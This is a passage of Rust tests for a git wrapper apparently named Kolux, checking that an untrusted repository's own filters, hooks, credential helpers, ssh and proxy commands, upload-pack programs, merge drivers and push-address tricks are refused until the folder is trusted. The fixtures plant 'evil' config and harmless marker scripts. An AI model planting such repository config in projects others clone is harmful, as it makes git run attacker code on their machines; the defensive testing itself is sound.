/// leaves submodules out, a write that runs filters is refused in an untrusted folder and runs
/// in a trusted one.
#[test]
fn t779c_a_capped_submodule_walk_fails_closed() {
    let dir = temp_repo("c-cap");
    let modules = dir.join(".git").join("modules");
    for i in 0..SUBMODULES_KEPT + 4 {
        let folder = modules.join(format!("m{i:04}"));
        fs::create_dir_all(&folder).unwrap();
        fs::write(folder.join("config"), "[core]\n\tbare = false\n").unwrap();
    }
    let mut got = Vec::new();
    assert!(!module_configs(&modules, &mut got, 0), "a walk over more than the cap says it was cut short");
    assert_eq!(got.len(), SUBMODULES_KEPT);
    let mut deep = dir.join(".git").join("deepmodules");
    for _ in 0..SUBMODULE_DEPTH + 3 {
        deep = deep.join("a").join("modules");
    }
    fs::create_dir_all(&deep).unwrap();
    let mut got = Vec::new();
    assert!(!module_configs(&dir.join(".git").join("deepmodules"), &mut got, 0), "a walk deeper than the cap says it was cut short");
    let status: Vec<String> = command(&["status", "--porcelain=v2", "-z"], Some(&dir)).get_args().map(|a| a.to_string_lossy().to_string()).collect();
    assert!(status.iter().any(|a| a == "--ignore-submodules=all"), "{status:?}");
    let why = run(&["add", "-A"], Some(&dir)).unwrap_err();
    assert!(why.contains("more submodules than Kolux can check") && why.contains("Trust the folder"), "{why}");
    let log: Vec<String> = command(&["log", "-1"], Some(&dir)).get_args().map(|a| a.to_string_lossy().to_string()).collect();
    assert_eq!(log, ["log", "-1"], "a read that starts no submodule git is left as it was");
    trust_for_test(&dir);
    run(&["add", "-A"], Some(&dir)).unwrap();
    let _ = fs::remove_dir_all(&dir);
}

/// Review fix 3, B2: a `modules/<name>` that is a link to a folder is followed, as git does.
#[test]
fn t779c_a_linked_modules_entry_is_followed() {
    let dir = temp_repo("c-link");
    let real = std::env::temp_dir().join(format!("kolux-git-c-link-real-{}", std::process::id()));
    let _ = fs::remove_dir_all(&real);
    fs::create_dir_all(&real).unwrap();
    fs::write(real.join("config"), "[filter \"evil\"]\n\tclean = evil\n").unwrap();
    let modules = dir.join(".git").join("modules");
    fs::create_dir_all(&modules).unwrap();
    #[cfg(windows)]
    let made = std::os::windows::fs::symlink_dir(&real, modules.join("linked")).is_ok();
    #[cfg(not(windows))]
    let made = std::os::unix::fs::symlink(&real, modules.join("linked")).is_ok();
    if made {
        let mut got = Vec::new();
        assert!(module_configs(&modules, &mut got, 0));
        assert_eq!(got.len(), 1, "{got:?}");
        assert!(blanked_keys(&command(&["status", "--porcelain=v2", "-z"], Some(&dir))).iter().any(|k| k == "filter.evil.clean"));
    }
    let _ = fs::remove_dir_all(&dir);
    let _ = fs::remove_dir_all(&real);
}

/// Review fix 3, B2: a submodule's own `config.worktree` is read as well.
#[test]
fn t779c_a_submodules_config_worktree_is_listed() {
    let (dir, git_dir, _marker) = submodule_with_filter("c-wtcfg", None);
    let status = ["status", "--porcelain=v2", "-z"];
    let base = blanked_keys(&command(&status, Some(&dir))).len();
    fs::write(git_dir.join("config.worktree"), "[filter \"other\"]\n\tsmudge = evil\n").unwrap();
    assert_eq!(blanked_keys(&command(&status, Some(&dir))).len(), base + 1);
    let _ = fs::remove_dir_all(&dir);
}

/// Review fix 3, S1: `includeIf "onbranch:"` makes the listing depend on the checked-out branch,
/// so a branch switch (which changes only HEAD) refreshes it.
#[test]
fn t779c_a_branch_switch_refreshes_an_onbranch_include() {
    let dir = temp_repo("c-onbranch");
    let git_dir = dir.join(".git");
    fs::write(git_dir.join("branch.cfg"), "[filter \"evil\"]\n\tclean = evil\n").unwrap();
    let mut text = fs::read_to_string(git_dir.join("config")).unwrap();
    text.push_str("[includeIf \"onbranch:feature\"]\n\tpath = branch.cfg\n");
    fs::write(git_dir.join("config"), text).unwrap();
    let status = ["status", "--porcelain=v2", "-z"];
    let base = blanked_keys(&command(&status, Some(&dir))).len();
    assert!(plain_git(&["switch", "-q", "-c", "feature"], &dir).status.success());
    assert_eq!(blanked_keys(&command(&status, Some(&dir))).len(), base + 1, "the listing followed the branch");
    assert!(plain_git(&["switch", "-q", "main"], &dir).status.success());
    assert_eq!(blanked_keys(&command(&status, Some(&dir))).len(), base, "and followed it back");
    let _ = fs::remove_dir_all(&dir);
}

/// Review fix 3, S2: only a regular file is read as config text, and only its first megabyte.
#[test]
fn t779c_include_targets_read_only_regular_files_and_only_a_megabyte() {
    let dir = temp_repo("c-small");
    let folder = dir.join("not-a-file.cfg");
    fs::create_dir_all(&folder).unwrap();
    assert!(read_small(&folder).is_none() && include_targets(&folder).is_empty());
    let big = dir.join("big.cfg");
    let mut text = "#".repeat((1 << 20) + 16);
    text.push_str("\n[include]\n\tpath = past-the-limit.cfg\n");
    fs::write(&big, text).unwrap();
    assert!(include_targets(&big).is_empty(), "the include after the first megabyte was read");
    let small = dir.join("small.cfg");
    fs::write(&small, "[include]\n\tpath = x.cfg\n").unwrap();
    assert_eq!(include_targets(&small).len(), 1);
    // A listing that does not finish is cut off instead of waited for.
    let slow = base_command(&["-c", "alias.slow=!sleep 30", "slow"], Some(&dir), &[], &[]);
    let started = std::time::Instant::now();
    assert!(output_within(slow, std::time::Duration::from_millis(400)).is_none());
    assert!(started.elapsed() < std::time::Duration::from_secs(20));
    let _ = fs::remove_dir_all(&dir);
}

/// Review fix 3, S3: a trusted folder with a repo-local `gpg.program` and no filter keeps it on
/// a commit (signing works); an untrusted one has it blanked, and the commit is not refused.
#[test]
fn t779c_a_trusted_folders_gpg_program_survives_a_commit() {
    let dir = temp_repo("c-gpg-trusted");
    run(&["config", "gpg.program", "my-signer"], Some(&dir)).unwrap();
    let commit = ["commit", "-q", "-m", "x"];
    let cmd = command_checked(&commit, Some(&dir)).expect("no filter: not refused");
    assert!(blanked_keys(&cmd).iter().any(|k| k == "gpg.program"), "untrusted: blanked");
    trust_for_test(&dir);
    let cmd = command_checked(&commit, Some(&dir)).unwrap();
    assert!(!blanked_keys(&cmd).iter().any(|k| k == "gpg.program"), "trusted: the signing program is kept");
    // A read in the same trusted folder still blanks it.
    assert!(blanked_keys(&command(&["log", "-1"], Some(&dir))).iter().any(|k| k == "gpg.program"));
    let _ = fs::remove_dir_all(&dir);
}

// ---- S4 (DT-C241, Txais 2026-11-08: "Yes, include it") -----------------------------------------

/// A hook of the folder's own that leaves `marker` and lets the command go on.
fn marker_hook(dir: &Path, name: &str, marker: &Path) {
    let path = dir.join(".git").join("hooks").join(name);
    fs::create_dir_all(path.parent().unwrap()).unwrap();
    fs::write(&path, format!("#!/bin/sh\necho ran >> \"{}\"\nexit 0\n", marker.to_string_lossy().replace('\\', "/"))).unwrap();
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        fs::set_permissions(&path, fs::Permissions::from_mode(0o755)).unwrap();
    }
}

/// An executable script beside `marker` that leaves it and passes its input through, as a path git can
/// run (S4). `core.gitProxy` is started as a program, never through a shell, so a shell line will not do.
fn marker_script(marker: &Path) -> String {
    let script = marker.with_extension("sh");
    fs::write(&script, format!("#!/bin/sh\necho ran >> \"{}\"\ncat\n", marker.to_string_lossy().replace('\\', "/"))).unwrap();
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        fs::set_permissions(&script, fs::Permissions::from_mode(0o755)).unwrap();
    }
    script.to_string_lossy().replace('\\', "/")
}

/// An executable script that leaves `marker` and exits at once, reading nothing (for programs git waits on).
fn exit_script(marker: &Path) -> String {
    let script = marker.with_extension("exit.sh");
    fs::write(&script, format!("#!/bin/sh\necho ran >> \"{}\"\nexit 1\n", marker.to_string_lossy().replace('\\', "/"))).unwrap();
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        fs::set_permissions(&script, fs::Permissions::from_mode(0o755)).unwrap();
    }
    script.to_string_lossy().replace('\\', "/")
}

/// A bare repository holding the history of `dir`, to be a remote for it.
fn bare_copy(dir: &Path, name: &str) -> PathBuf {
    let bare = std::env::temp_dir().join(format!("kolux-git-{name}-bare-{}", std::process::id()));
    let _ = fs::remove_dir_all(&bare);
    assert!(plain_git(&["clone", "-q", "--bare", &dir.to_string_lossy(), &bare.to_string_lossy()], dir).status.success());
    bare
}

/// A pre-receive hook in the bare repository `payload` that leaves `marker` and rejects the push.
fn receive_hook(payload: &Path, marker: &Path) {
    let hook = payload.join("hooks").join("pre-receive");
    fs::create_dir_all(hook.parent().unwrap()).unwrap();
    fs::write(&hook, format!("#!/bin/sh\necho ran >> \"{}\"\nexit 1\n", marker.to_string_lossy().replace('\\', "/"))).unwrap();
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        fs::set_permissions(&hook, fs::Permissions::from_mode(0o755)).unwrap();
    }
}

fn refused(args: &[&str], dir: &Path) -> Option<String> {
    write_refusal(args, Some(dir))
}

fn plain_message(why: &str, verb: &str) {
    assert!(why.contains(&format!("git {verb}")) && why.contains("not trusted") && why.contains("Trust the folder"), "{why}");
}

/// S4: a credential helper of the folder's own is refused on every transfer (it is handed the
/// user's sign-in details), the plain message names it, a commit is not a transfer, and trust lifts it.
#[test]
fn t779d_a_folders_own_credential_helper_refuses_every_transfer_until_trusted() {
    let dir = temp_repo("d-credential");
    for key in ["credential.helper", "credential.https://example.com.helper"] {
        run(&["config", key, "my-helper"], Some(&dir)).unwrap();
        for args in [&["fetch", "origin"][..], &["push", "origin", "main"], &["pull"], &["ls-remote", "origin"], &["-c", "x.y=z", "fetch"]] {
            let why = refused(args, &dir).unwrap_or_else(|| panic!("{key} {args:?} was not refused"));
            plain_message(&why, after_options(args)[0]);
            assert!(why.contains("credential helper") && why.contains(key.to_lowercase().split("//").next().unwrap().trim_end_matches(':')), "{why}");
            assert!(run(args, Some(&dir)).is_err() && command_checked(args, Some(&dir)).is_err());
        }
        assert!(refused(&["commit", "-q", "-m", "x"], &dir).is_none() && refused(&["status"], &dir).is_none(), "not a transfer");
        run(&["config", "--unset-all", key], Some(&dir)).unwrap();
    }
    run(&["config", "credential.helper", "my-helper"], Some(&dir)).unwrap();
    trust_for_test(&dir);
    for args in [&["fetch", "origin"][..], &["push", "origin", "main"], &["pull"], &["ls-remote", "origin"]] {
        assert!(refused(args, &dir).is_none() && command_checked(args, Some(&dir)).is_ok(), "{args:?}");
    }
    let _ = fs::remove_dir_all(&dir);
}

/// S4: `core.hooksPath` makes any write, ref change or transfer unsafe in an untrusted folder.
#[test]
fn t779d_a_folders_own_hooks_path_refuses_writes_and_transfers_until_trusted() {
    let dir = temp_repo("d-hookspath");
    run(&["config", "core.hooksPath", "evil-hooks"], Some(&dir)).unwrap();
    for args in [&["commit", "-q", "-m", "x"][..], &["push", "origin", "main"], &["fetch"], &["merge", "side"], &["checkout", "-q", "main"], &["add", "-A"], &["branch", "-D", "nope"], &["tag", "v1"]] {
        let why = refused(args, &dir).unwrap_or_else(|| panic!("{args:?} was not refused"));
        plain_message(&why, after_options(args)[0]);
        assert!(why.contains("core.hookspath"), "{why}");
    }
    for args in [&["status"][..], &["log", "-1"], &["diff"], &["branch", "--show-current"], &["branch", "-a"], &["tag", "-l"], &["config", "--list"]] {
        assert!(refused(args, &dir).is_none(), "{args:?} is a read");
    }
    trust_for_test(&dir);
    for args in [&["commit", "-q", "-m", "x"][..], &["push", "origin", "main"], &["fetch"], &["tag", "v1"]] {
        assert!(refused(args, &dir).is_none(), "{args:?}");
    }
    let _ = fs::remove_dir_all(&dir);
}

/// S4: an executable hook in the hooks folder is refused only for the commands that would start it,
/// a `.sample` never is, nothing runs when refused, and a trusted folder runs the hook.
#[test]
fn t779d_a_folders_own_executable_hook_refuses_the_command_that_would_run_it_until_trusted() {
    let dir = temp_repo("d-hook");
    let marker = dir.join("hook-ran.txt");
    marker_hook(&dir, "pre-commit.sample", &marker);
    assert!(refused(&["commit", "-q", "-m", "x"], &dir).is_none(), "a .sample is never run");
    marker_hook(&dir, "pre-commit", &marker);
    marker_hook(&dir, "pre-push", &marker);
    marker_hook(&dir, "post-checkout", &marker);
    let why = refused(&["commit", "-q", "-m", "x"], &dir).expect("pre-commit refuses commit");
    plain_message(&why, "commit");
    assert!(why.contains("\"pre-commit\"") && why.contains("hook"), "{why}");
    let why = refused(&["push", "origin", "main"], &dir).expect("pre-push refuses push");
    assert!(why.contains("\"pre-push\""), "{why}");
    let why = refused(&["checkout", "-q", "main"], &dir).expect("post-checkout refuses checkout");
    assert!(why.contains("\"post-checkout\""), "{why}");
    // A command that starts none of these hooks goes ahead.
    assert!(refused(&["fetch", "origin"], &dir).is_none(), "fetch starts none of the three");
    assert!(refused(&["add", "-A"], &dir).is_none(), "add starts only post-index-change");
    assert!(refused(&["status"], &dir).is_none());
    // Refused for real: nothing ran, nothing was committed.
    fs::write(dir.join("README.md"), "changed\n").unwrap();
    run(&["add", "-A"], Some(&dir)).unwrap();
    assert!(run(&["commit", "-q", "-m", "second"], Some(&dir)).is_err());
    assert!(!marker.exists(), "a refused command ran the hook");
    assert_eq!(run(&["rev-list", "--count", "HEAD"], Some(&dir)).unwrap().trim(), "1");
    // Trusted: the commit runs and so does the hook.
    trust_for_test(&dir);
    run(&["commit", "-q", "-m", "second"], Some(&dir)).unwrap();
    assert!(marker.exists(), "the trusted folder's own hook did not run");
    let _ = fs::remove_dir_all(&dir);
}

/// S4: a merge driver of the folder's own is refused for the commands that merge content, and only those.
#[test]
fn t779d_a_folders_own_merge_driver_refuses_merging_commands_until_trusted() {
    let dir = temp_repo("d-merge");
    // A remote that is not on this computer, so `push origin` is judged only for its merge driver.
    run(&["remote", "add", "origin", "https://example.com/a/b.git"], Some(&dir)).unwrap();
    run(&["config", "merge.evil.driver", "evil %O %A %B"], Some(&dir)).unwrap();
    for args in [&["merge", "side"][..], &["pull"], &["pull", "--rebase"], &["rebase", "main"], &["cherry-pick", "abc"], &["revert", "abc"], &["stash", "pop"]] {
        let why = refused(args, &dir).unwrap_or_else(|| panic!("{args:?} was not refused"));
        plain_message(&why, after_options(args)[0]);
        assert!(why.contains("merge driver") && why.contains("merge.evil.driver"), "{why}");
    }
    for args in [&["commit", "-q", "-m", "x"][..], &["fetch"], &["push", "origin", "main"], &["status"], &["add", "-A"], &["checkout", "-q", "main"], &["stash", "list"]] {
        assert!(refused(args, &dir).is_none(), "{args:?} runs no merge driver");
    }
    trust_for_test(&dir);
    for args in [&["merge", "side"][..], &["pull"], &["rebase", "main"], &["cherry-pick", "abc"]] {
        assert!(refused(args, &dir).is_none(), "{args:?}");
    }
    let _ = fs::remove_dir_all(&dir);
}

/// S4: a submodule's hooks folder is looked at too.
#[test]
fn t779d_a_submodules_own_hook_refuses_the_command_that_would_run_it() {
    let (dir, sub_git, _marker) = submodule_with_filter("d-sub-hook", None);
    let marker = dir.join("sub-hook-ran.txt");
    let hooks = sub_git.join("hooks");
    fs::create_dir_all(&hooks).unwrap();
    fs::write(hooks.join("pre-commit"), format!("#!/bin/sh\necho ran >> \"{}\"\n", marker.to_string_lossy().replace('\\', "/"))).unwrap();
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        fs::set_permissions(hooks.join("pre-commit"), fs::Permissions::from_mode(0o755)).unwrap();
    }
    // The filter of the same submodule is refused first; take it away to see the hook's refusal.
    run(&["config", "--file", &sub_git.join("config").to_string_lossy(), "--unset-all", "filter.evil.clean"], Some(&dir)).unwrap();
    let why = refused(&["commit", "-q", "-m", "x"], &dir).expect("the submodule's hook refuses the commit");
    assert!(why.contains("\"pre-commit\""), "{why}");
    assert!(!marker.exists());
    let _ = fs::remove_dir_all(&dir);
}

/// S4: the folder's own ssh command, proxy command, upload-pack and receive-pack programs never run
/// on a transfer (plain git runs each: the control), and the transfer still goes through.
#[test]
fn t779d_a_folders_own_transfer_programs_never_run() {
    ISOLATED.with(|i| i.set(true));
    let dir = temp_repo("d-net");
    let marker = dir.join("net-ran.txt");
    let program = marker_program(&marker);
    let bare = bare_copy(&dir, "d-net");
    // ssh command: plain git runs it for an ssh URL; Kolux's git runs the real ssh (which fails: nothing listens).
    run(&["remote", "add", "viassh", "ssh://127.0.0.1:1/x"], Some(&dir)).unwrap();
    run(&["config", "core.sshCommand", &program], Some(&dir)).unwrap();
    assert!(!plain_git(&["fetch", "viassh"], &dir).status.success());
    assert!(marker.exists(), "the premise: plain git runs core.sshCommand");
    fs::remove_file(&marker).unwrap();
    let _ = run(&["fetch", "viassh"], Some(&dir));
    assert!(!marker.exists(), "Kolux's git ran the folder's core.sshCommand");
    run(&["config", "--unset-all", "core.sshCommand"], Some(&dir)).unwrap();
    // proxy command: for a git:// URL.
    run(&["remote", "add", "viaproxy", "git://127.0.0.1:1/x"], Some(&dir)).unwrap();
    run(&["config", "core.gitProxy", &marker_script(&marker)], Some(&dir)).unwrap();
    assert!(!plain_git(&["fetch", "viaproxy"], &dir).status.success());
    assert!(marker.exists(), "the premise: plain git runs core.gitProxy");
    fs::remove_file(&marker).unwrap();
    let _ = run(&["fetch", "viaproxy"], Some(&dir));
    assert!(!marker.exists(), "Kolux's git ran the folder's core.gitProxy");
    run(&["config", "--unset-all", "core.gitProxy"], Some(&dir)).unwrap();
    // upload-pack and receive-pack: a local remote runs them through the shell. git keeps the FIRST
    // value it reads for these, so they cannot be replaced: the transfer is refused instead.
    run(&["remote", "add", "local", &bare.to_string_lossy()], Some(&dir)).unwrap();
    run(&["config", "remote.local.uploadpack", &program], Some(&dir)).unwrap();
    run(&["config", "remote.local.receivepack", &program], Some(&dir)).unwrap();
    assert!(!plain_git(&["fetch", "local"], &dir).status.success());
    assert!(marker.exists(), "the premise: plain git runs remote.<name>.uploadpack");
    fs::remove_file(&marker).unwrap();
    for args in [&["fetch", "local"][..], &["push", "local", "main"], &["ls-remote", "local"], &["pull", "local", "main"]] {
        let why = run(args, Some(&dir)).unwrap_err();
        plain_message(&why, args[0]);
        assert!(why.contains("remote.local.uploadpack") || why.contains("remote.local.receivepack") || why.contains("on this computer"), "{why}");
    }
    assert!(!marker.exists(), "Kolux's git ran the folder's uploadpack or receivepack");
    assert!(refused(&["status"], &dir).is_none() && refused(&["commit", "-q", "-m", "x"], &dir).is_none(), "not a transfer");
    // An ssh command of the folder's own is replaced on a read too (a partial clone's read can fetch).
    run(&["config", "core.sshCommand", &program], Some(&dir)).unwrap();
    let status = command(&["status"], Some(&dir));
    assert!(status.get_envs().any(|(k, v)| k == "GIT_SSH_COMMAND" && v.is_some_and(|v| v == "ssh")), "{:?}", status.get_envs().collect::<Vec<_>>());
    // Trusted: the folder's own programs are the user's to run.
    trust_for_test(&dir);
    assert!(refused(&["fetch", "local"], &dir).is_none());
    ISOLATED.with(|i| i.set(false));
    let _ = fs::remove_dir_all(&dir);
    let _ = fs::remove_dir_all(&bare);
}

/// S4: a replaced key is not a blank: what the USER's own config says for the key still applies
/// (a blank would have overridden it, and an empty ssh command runs nothing at all).
#[test]
fn t779d_the_users_own_transfer_programs_still_apply_when_the_folder_sets_the_same_keys() {
    ISOLATED.with(|i| i.set(true));
    let dir = temp_repo("d-user-net");
    let bare = bare_copy(&dir, "d-user-net");
    let (mine, theirs) = (dir.join("user-ran.txt"), dir.join("folder-ran.txt"));
    let global = std::env::temp_dir().join(format!("kolux-git-d-user-net-global-{}", std::process::id()));
    let _ = fs::remove_file(&global);
    let global_s = global.to_string_lossy().to_string();
    for (key, value) in [("core.sshCommand", marker_program(&mine)), ("core.gitProxy", marker_script(&mine))] {
        assert!(plain_git(&["config", "--file", &global_s, key, &value], &dir).status.success());
    }
    GLOBAL_FOR_TEST.with(|g| *g.borrow_mut() = Some(global.clone()));
    for (key, value) in [("core.sshCommand", marker_program(&theirs)), ("core.gitProxy", marker_script(&theirs))] {
        run(&["config", key, &value], Some(&dir)).unwrap();
    }
    run(&["remote", "add", "viassh", "ssh://127.0.0.1:1/x"], Some(&dir)).unwrap();
    run(&["remote", "add", "viaproxy", "git://127.0.0.1:1/x"], Some(&dir)).unwrap();
    for remote in ["viassh", "viaproxy"] {
        let _ = fs::remove_file(&mine);
        let _ = run(&["fetch", remote], Some(&dir));
        assert!(mine.exists(), "{remote}: the user's own program did not run");
        assert!(!theirs.exists(), "{remote}: the folder's own program ran");
    }
    // A proxy rule of the user's that is limited to some domains cannot be carried over: the
    // transfer is refused plainly rather than run without it; a read still runs.
    assert!(plain_git(&["config", "--file", &global_s, "core.gitProxy", "some-proxy for example.com"], &dir).status.success());
    let why = run(&["fetch", "viaproxy"], Some(&dir)).unwrap_err();
    assert!(why.contains("core.gitProxy") && why.contains("Trust the folder"), "{why}");
    assert!(command(&["status"], Some(&dir)).output().unwrap().status.success());
    GLOBAL_FOR_TEST.with(|g| *g.borrow_mut() = None);
    ISOLATED.with(|i| i.set(false));
    let _ = fs::remove_file(&global);
    let _ = fs::remove_dir_all(&dir);
    let _ = fs::remove_dir_all(&bare);
}

/// S4: in a trusted folder the transfer programs are the folder's own and run as written; no
/// replacement is injected.
#[test]
fn t779d_a_trusted_folders_transfer_programs_run_normally() {
    ISOLATED.with(|i| i.set(true));
    let dir = temp_repo("d-net-trusted");
    let marker = dir.join("trusted-ran.txt");
    run(&["config", "core.sshCommand", &marker_program(&marker)], Some(&dir)).unwrap();
    run(&["remote", "add", "viassh", "ssh://127.0.0.1:1/x"], Some(&dir)).unwrap();
    trust_for_test(&dir);
    let cmd = command_checked(&["fetch", "viassh"], Some(&dir)).unwrap();
    assert!(!cmd.get_envs().any(|(k, v)| k == "GIT_SSH_COMMAND" && v.is_some()), "a trusted folder's ssh command is not replaced");
    let _ = run(&["fetch", "viassh"], Some(&dir));
    assert!(marker.exists(), "the trusted folder's own ssh command did not run");
    ISOLATED.with(|i| i.set(false));
    let _ = fs::remove_dir_all(&dir);
}

/// S4: the ref-changing forms of branch and tag are told from their reading forms.
#[test]
fn t779d_ref_changes_are_told_from_reads() {
    for args in [&["branch", "x"][..], &["branch", "-D", "x"], &["tag", "v1"], &["tag", "-d", "v1"], &["update-ref", "refs/heads/x", "HEAD"], &["branch", "-m", "a", "b"]] {
        assert!(ref_write(args), "{args:?}");
    }
    for args in [&["branch"][..], &["branch", "--show-current"], &["branch", "-a"], &["branch", "--list", "x*"], &["tag"], &["tag", "-l", "v*"], &["branch", "--contains", "abc"], &["status"], &["commit", "-m", "x"]] {
        assert!(!ref_write(args), "{args:?}");
    }
}

// ---- Review fix 4 (independent review of S4, 2026-11-09) ---------------------------------------------

/// B1: Kolux's background tidy runs `gc --auto`; a folder's own pre-auto-gc hook must not run with it,
/// and unstaging (`rm --cached`) must not run post-index-change. A trusted folder runs them.
#[test]
fn t779e_gc_and_index_commands_check_the_folders_hooks() {
    let dir = temp_repo("e-gc");
    let marker = dir.join("gc-hook-ran.txt");
    marker_hook(&dir, "pre-auto-gc", &marker);
    marker_hook(&dir, "post-index-change", &marker);
    run(&["config", "gc.auto", "1"], Some(&dir)).unwrap();
    for args in [&["gc", "--auto", "--quiet"][..], &["rm", "--cached", "-q", "README.md"], &["update-index", "--refresh"], &["mv", "README.md", "R.md"]] {
        let why = refused(args, &dir).unwrap_or_else(|| panic!("{args:?} was not refused"));
        plain_message(&why, args[0]);
        assert!(run(args, Some(&dir)).is_err());
    }
    assert!(!marker.exists(), "a refused command ran the folder's hook");
    assert!(crate::tidy::tidy_repo(&dir).is_err() && !marker.exists(), "the tidy pass stops at the gate");
    trust_for_test(&dir);
    assert!(refused(&["gc", "--auto", "--quiet"], &dir).is_none());
    let _ = fs::remove_dir_all(&dir);
}

/// B2 (review fix 5): a push into a repository on this computer runs THAT repository's hooks, filters and gc
/// under its own config, so from an untrusted folder any push is refused when any of the folder's push
/// URLs is local: whichever remote git would pick (pushDefault), every pushurl, or a path argument. Pushes
/// to remote URLs go ahead, and a trusted folder pushes anywhere.
#[test]
fn t779e_a_push_that_could_reach_a_local_repository_is_refused() {
    let dir = temp_repo("e-push");
    let marker = dir.join("receive-ran.txt");
    let payload = bare_copy(&dir, "e-push-payload");
    fs::create_dir_all(payload.join("hooks")).unwrap();
    fs::write(payload.join("hooks").join("post-receive"), format!("#!/bin/sh\necho ran >> \"{}\"\n", marker.to_string_lossy().replace('\\', "/"))).unwrap();
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        fs::set_permissions(payload.join("hooks").join("post-receive"), fs::Permissions::from_mode(0o755)).unwrap();
    }
    // A normal-looking origin, and a pushDefault that sends a bare `git push` to the payload (review 1).
    run(&["remote", "add", "origin", "https://example.com/a/b.git"], Some(&dir)).unwrap();
    run(&["remote", "add", "evil", &payload.to_string_lossy()], Some(&dir)).unwrap();
    run(&["config", "remote.pushDefault", "evil"], Some(&dir)).unwrap();
    for args in [&["push"][..], &["push", "origin", "main"], &["push", "-q", "--repo=origin"]] {
        let why = refused(args, &dir).unwrap_or_else(|| panic!("{args:?} was not refused"));
        plain_message(&why, "push");
        assert!(why.contains("on this computer"), "{why}");
    }
    assert!(run(&["push", "-q", "evil", "main"], Some(&dir)).is_err());
    assert!(!marker.exists(), "the receiving repository's hook ran");
    // A second pushurl on an otherwise remote origin (review 2), and a path argument.
    let dir2 = temp_repo("e-push-2");
    run(&["remote", "add", "origin", "https://example.com/a/b.git"], Some(&dir2)).unwrap();
    run(&["config", "--add", "remote.origin.pushurl", "https://example.com/a/b.git"], Some(&dir2)).unwrap();
    run(&["config", "--add", "remote.origin.pushurl", &payload.to_string_lossy()], Some(&dir2)).unwrap();
    assert!(refused(&["push", "origin", "main"], &dir2).is_some());
    let dir3 = temp_repo("e-push-3");
    assert!(refused(&["push", ".", "HEAD:refs/heads/x"], &dir3).is_some());
    assert!(refused(&["push", "./x.git", "main"], &dir3).is_some());
    // Only remote URLs: the push is not refused here (it fails later, offline, but no gate stops it).
    run(&["remote", "add", "origin", "https://example.com/a/b.git"], Some(&dir3)).unwrap();
    assert!(refused(&["push", "origin", "main"], &dir3).is_none());
    // Trusted: the user's own local remote works.
    trust_for_test(&dir);
    assert!(refused(&["push"], &dir).is_none());
    for d in [&dir, &dir2, &dir3, &payload] {
        let _ = fs::remove_dir_all(d);
    }
}

/// Review fix 6: the six ways the fifth round still reached a local repository, each from an untrusted folder.
#[test]
fn t779e_push_addresses_are_resolved_by_git_itself() {
    let base = temp_repo("e-p6-src");
    let payload = bare_copy(&base, "e-p6-payload");
    let p = payload.to_string_lossy().replace('\\', "/");
    let must = |dir: &Path, args: &[&str], what: &str| {
        let why = refused(args, dir).unwrap_or_else(|| panic!("{what}: {args:?} was not refused"));
        assert!(why.contains("on this computer"), "{what}: {why}");
    };
    // 1. No origin remote; insteadOf rewrites the word "origin" to the payload.
    let d1 = temp_repo("e-p6-1");
    run(&["config", &format!("url.{p}.insteadOf"), "origin"], Some(&d1)).unwrap();
    must(&d1, &["push", "--set-upstream", "--", "origin", "main"], "insteadOf");
    // 2, 3. Legacy remote files.
    let d2 = temp_repo("e-p6-2");
    fs::create_dir_all(d2.join(".git").join("remotes")).unwrap();
    fs::write(d2.join(".git").join("remotes").join("origin"), format!("URL: {p}\n")).unwrap();
    must(&d2, &["push", "origin", "main"], ".git/remotes");
    let d3 = temp_repo("e-p6-3");
    fs::create_dir_all(d3.join(".git").join("branches")).unwrap();
    fs::write(d3.join(".git").join("branches").join("origin"), format!("{p}\n")).unwrap();
    must(&d3, &["push", "origin", "main"], ".git/branches");
    // 4. No remote at all: a bare word is a path to git.
    let d4 = temp_repo("e-p6-4");
    must(&d4, &["push", "origin", "main"], "a word that is no remote");
    // 5. A bare push whose pushDefault (or the branch's remote) is a path.
    let d5 = temp_repo("e-p6-5");
    run(&["config", "remote.pushDefault", &p], Some(&d5)).unwrap();
    must(&d5, &["push"], "pushDefault path");
    let d5b = temp_repo("e-p6-5b");
    run(&["config", "branch.main.remote", &p], Some(&d5b)).unwrap();
    must(&d5b, &["push"], "branch remote path");
    // 6. An untrusted push never recurses into submodules.
    let cmd = command_checked(&["push", "https://example.com/a.git", "main"], Some(&d4)).unwrap();
    assert!(blanked_keys(&cmd).iter().any(|k| k == "push.recurseSubmodules"));
    // A remote-only folder is still not refused.
    let ok = temp_repo("e-p6-ok");
    run(&["remote", "add", "origin", "https://example.com/a/b.git"], Some(&ok)).unwrap();
    assert!(refused(&["push", "--set-upstream", "--", "origin", "main"], &ok).is_none());
    assert!(refused(&["push"], &ok).is_none());
    for d in [&base, &payload, &d1, &d2, &d3, &d4, &d5, &d5b, &ok] {
        let _ = fs::remove_dir_all(d);
    }
}

/// Review fix 7: a tag named like the branch, and a legacy remote file with two URL lines.
#[test]
fn t779e_tag_named_branches_and_legacy_url_lists() {
    let base = temp_repo("e-p7-src");
    let payload = bare_copy(&base, "e-p7-payload");
    let p = payload.to_string_lossy().replace('\\', "/");
    // A tag called main hides branch.main.pushRemote from `symbolic-ref --short`.
    let d1 = temp_repo("e-p7-1");
    run(&["tag", "main"], Some(&d1)).unwrap();
    run(&["remote", "add", "origin", "https://example.invalid/a.git"], Some(&d1)).unwrap();
    run(&["config", "branch.main.pushRemote", &p], Some(&d1)).unwrap();
    assert!(refused(&["push"], &d1).is_some(), "the branch's pushRemote behind a tag of the same name");
    // A legacy remote file with a remote first URL and a local second one.
    let d2 = temp_repo("e-p7-2");
    fs::create_dir_all(d2.join(".git").join("remotes")).unwrap();
    fs::write(d2.join(".git").join("remotes").join("origin"), format!("URL: https://example.invalid/ok.git\nURL: {p}\n")).unwrap();
    assert!(refused(&["push", "--set-upstream", "--", "origin", "main"], &d2).is_some(), "every URL line of a legacy remote");
    // No such remote: a plain message.
    let d3 = temp_repo("e-p7-3");
    assert!(refused(&["push", "origin", "main"], &d3).unwrap().contains("no remote called origin"));
    for d in [&base, &payload, &d1, &d2, &d3] {
        let _ = fs::remove_dir_all(d);
    }
}

/// Review fix 7's backstop, live (review fix 8, P1-4): the command Kolux builds for an untrusted push to a
/// remote origin is run AFTER origin's address has been switched to a local payload repository (what any
